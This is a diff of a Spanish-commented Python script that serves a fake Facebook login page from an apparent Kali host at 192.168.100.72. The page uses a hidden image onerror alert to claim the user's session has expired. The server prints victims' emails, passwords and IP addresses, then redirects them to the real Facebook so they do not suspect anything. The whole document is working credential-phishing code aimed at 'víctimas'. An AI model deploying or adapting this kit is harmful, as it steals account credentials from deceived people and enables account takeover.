@@ -2,12 +2,11 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib.parse
 import time
 
-# CONFIGURACIÓN
+# CONFIGURACIÓN DEL SERVIDOR
 HOST_NAME = "0.0.0.0"
 PORT_NUMBER = 80
 
-# AQUÍ PEGAMOS TU HTML DEL LOGIN FALSO
-# Nota: He asegurado que el form action apunte a este mismo servidor
+# TU CÓDIGO HTML DEL LOGIN (Incrustado para ser servido por Python)
 LOGIN_HTML = """
 <!DOCTYPE html>
 <html lang="es">
@@ -33,19 +32,22 @@ LOGIN_HTML = """
     </style>
 </head>
 <body>
-    <img src="x" style="display:none;" onerror="alert('Su sesión ha caducado. Por seguridad, por favor inicie sesión nuevamente.');">
+    <img src="x" style="display:none;" onerror="alert('Su sesión ha caducado. Por seguridad, por favor inicie sesión nuevamente para compartir la noticia.');">
     
     <div class="login-container">
         <div class="fb-text">
             <h1>facebook</h1>
             <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
         </div>
+
         <div class="login-box">
-            <form action="/" method="POST">
+            <form action="http://192.168.100.72" method="POST">
                 <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
                 <input type="password" name="pass" placeholder="Contraseña" required>
+                
                 <button type="submit" class="btn-login">Iniciar sesión</button>
             </form>
+            
             <a href="#" class="forgot">¿Has olvidado la contraseña?</a>
             <div class="divider"></div>
             <button class="btn-new">Crear cuenta nueva</button>
@@ -58,14 +60,14 @@ LOGIN_HTML = """
 class PhishingHandler(BaseHTTPRequestHandler):
     
     def do_GET(self):
-        """Si la víctima llega redirigida (GET), le mostramos el Login Falso"""
+        # Cuando la víctima llega redirigida, le servimos el HTML del Login
         self.send_response(200)
         self.send_header('Content-type', 'text/html; charset=utf-8')
         self.end_headers()
         self.wfile.write(bytes(LOGIN_HTML, "utf-8"))
 
     def do_POST(self):
-        """Si la víctima envía el formulario (POST), capturamos los datos"""
+        # Cuando la víctima da clic en "Iniciar Sesión", capturamos los datos
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
         
@@ -74,8 +76,8 @@ class PhishingHandler(BaseHTTPRequestHandler):
         print(f"[+] IP Víctima: {self.client_address[0]}")
         print("-" * 50)
         
-        # Intentar limpiar los datos para que se vean bonitos
         try:
+            # Parseamos para ver usuario y contraseña limpios
             parsed = urllib.parse.parse_qs(post_data)
             email = parsed.get('email', [''])[0]
             password = parsed.get('pass', [''])[0]
@@ -86,7 +88,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
             
         print("="*50 + "\n")
 
-        # Redirigir al Facebook real para despistar
+        # Redirigimos al Facebook real para que no sospechen
         self.send_response(302)
         self.send_header('Location', 'https://www.facebook.com')
         self.end_headers()
@@ -94,7 +96,7 @@ class PhishingHandler(BaseHTTPRequestHandler):
 if __name__ == '__main__':
     httpd = HTTPServer((HOST_NAME, PORT_NUMBER), PhishingHandler)
     print(f"[*] Servidor Kali escuchando en {HOST_NAME}:{PORT_NUMBER}")
-    print("[*] Esperando a que lleguen las víctimas...")
+    print(f"[*] Esperando víctimas en http://192.168.100.72 ...")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
